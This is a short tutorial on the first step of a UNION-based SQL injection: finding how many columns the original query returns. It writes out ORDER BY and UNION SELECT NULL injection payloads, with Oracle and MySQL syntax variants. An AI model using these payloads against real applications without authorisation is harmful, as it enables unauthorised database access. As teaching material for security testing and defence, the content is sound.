
---
### Determining the Number of Columns

Before performing a `UNION` SQL injection, you need to determine **how many columns the original query returns**.

There are two common methods.

### 1. Using `ORDER BY`

Increment the column index until the application's response changes or an error occurs:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

For example:

```
ORDER BY 1 → works
ORDER BY 2 → works
ORDER BY 3 → error
```

This indicates that the original query returns **2 columns**.

The reason is that `ORDER BY 3` attempts to sort by a third column that doesn't exist in the result set.

---

### 2. Using `UNION SELECT NULL`

Try an increasing number of `NULL` values:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Suppose:

```
1 NULL     → error
2 NULLs    → works
3 NULLs    → error
```

Then the original query has **2 columns**.

`NULL` is used because it is generally compatible with common SQL data types, increasing the chance that the query will work once the correct column count is reached.

### Why column count matters

The two queries in a `UNION` must return the **same number of columns**:

```
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2;
```

Both return 2 columns.

---

### Oracle-specific syntax

Oracle requires every `SELECT` to have a `FROM` clause, so use the built-in `DUAL` table:

```
' UNION SELECT NULL FROM DUAL--
```

For multiple columns:

```
' UNION SELECT NULL,NULL FROM DUAL--
```

### Comment syntax

`--` comments out the remainder of the original query.

On **MySQL**, `--` generally needs a trailing space:

```
' ORDER BY 1-- 
```

Alternatively, MySQL supports:

```
' ORDER BY 1#
```

The exact comment syntax therefore depends on the **database engine**.